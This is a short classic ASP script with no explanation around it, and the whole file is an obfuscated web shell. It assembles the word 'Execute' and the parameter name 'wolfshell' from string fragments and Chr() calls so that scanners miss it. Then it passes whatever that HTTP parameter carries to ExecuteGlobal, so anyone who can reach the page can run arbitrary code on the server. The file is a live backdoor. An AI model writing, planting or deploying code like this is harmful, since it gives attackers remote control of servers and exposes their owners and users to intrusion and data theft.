<%
Dim s_a1, s_b2, s_c3, s_d4, s_e5
s_a1 = "E"
s_b2 = "x"
s_c3 = s_a1 & s_b2 & Chr(101) & "c" & "u" & Chr(116) & "e"
s_d4 = Join(Array("wo", "lf", "sh", "ell"), "")
s_e5 = request(s_d4)
If Len(s_e5) > 0 Then
  Dim c_f6
  c_f6 = s_c3 & "(s_e5)"
  ExecuteGlobal(c_f6)
End If
%>